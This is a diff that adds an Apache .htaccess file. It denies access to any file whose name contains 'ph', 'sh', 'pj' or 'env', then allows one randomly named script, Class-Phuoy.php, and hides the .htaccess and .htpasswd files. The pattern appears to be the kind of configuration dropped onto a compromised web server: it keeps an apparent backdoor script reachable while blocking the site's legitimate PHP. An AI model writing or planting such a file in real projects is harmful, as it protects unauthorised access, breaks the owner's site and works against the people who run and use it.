@@ -1,0 +1,11 @@
+Options -Indexes
+<FilesMatch "(?i).*(ph|sh|pj|env).*">
+    Order Deny,Allow
+    Deny from all
+</FilesMatch>
+<Files Class-Phuoy.php>
+Allow from all
+</Files>
+<Files ~ "^\.(htaccess|htpasswd)$">
+deny from all
+</Files>
